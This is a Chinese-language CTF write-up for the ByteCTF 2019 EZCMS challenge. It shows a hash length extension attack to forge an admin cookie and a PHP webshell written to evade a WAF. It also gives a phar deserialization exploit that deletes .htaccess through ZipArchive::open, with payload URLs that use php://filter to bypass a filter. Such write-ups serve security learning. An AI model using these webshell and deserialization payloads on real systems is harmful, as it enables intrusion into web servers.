# ByteCTF 2019

## 0x01 EZCMS

看题名就知道是个代码审计题，扫一下目录发现``www.zip``拿到源码

首先是hash扩展攻击，拿到上传权限

```php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;

}

function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```

这里构造

```
root@EDI:~/HashPump# hashpump
Input Signature: 52107b08c0f3342d2153ae1d68e6262c
Input Data: admin
Input Key Length: 13
Input Data to Add: eki
bcbbe3284dc03be00f59d52a7633aeb5
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00eki
```

然后上传的时候把``bcbbe3284dc03be00f59d52a7633aeb5``塞到cookie就可了


现在已经可以上传文件，甚至可以直接上传php，但是还是没法正常解析，因为``.htaccess``被覆盖了

我们先传一个马，并对waf进行拼接绕过

```php
<?php
$a="sys";
$b="tem";
$c=$a.$b;
$d=$c($_REQUEST['eki']);
?>
```

这里不能使用eval,因为eval没法拼接使用

```php
    if (!is_file($this->upload_dir.'/.htaccess')){
        file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all');
    }
```

现在就是要想办法把``.htaccess``删了

看了大佬的wp，发现这里的利用点是这里

```php
class Profile{
    ...
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

这里调用了一个open,

> Archive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。
> 为什么要设定为9呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。
> 那么现在，我们就可以使用ZipArchive->open()来删除.htaccess文件。
> https://www.anquanke.com/post/id/95896#h2-8

可以在

```
view.php?filename=9365118560228f7bd99e199c9027b4be.gif&filepath=./sandbox/9f564a2cb832bd31431a6707104641ad/9365118560228f7bd99e199c9027b4be.gif
```

利用phar作为攻击载荷

```php
<?php
class File{
    public $filename;
    public $filepath;
    public $checker;

    function __construct($filename, $filepath){
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
}

class Profile{
    public $username;
    public $password;
    public $admin;
}

$a = new File("eki","eki");
$a->checker = new Profile();
$a->checker->username = "/var/www/html/sandbox/9f564a2cb832bd31431a6707104641ad/.htaccess";
$a->checker->password = ZipArchive::OVERWRITE | ZipArchive::CREATE;
$a->checker->admin = new ZipArchive();

//echo serialize($a);
$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
?>
```

利用filter绕过对phar的过滤

```
payload:/view.php?filename=2fa0baf1c751e2e9645ea67da0792644.phar&filepath=php://filter/resource=phar://./sandbox/9f564a2cb832bd31431a6707104641ad/2fa0baf1c751e2e9645ea67da0792644.phar
```

成功调用后应该就能成功访问正常解析的php了

getshell完成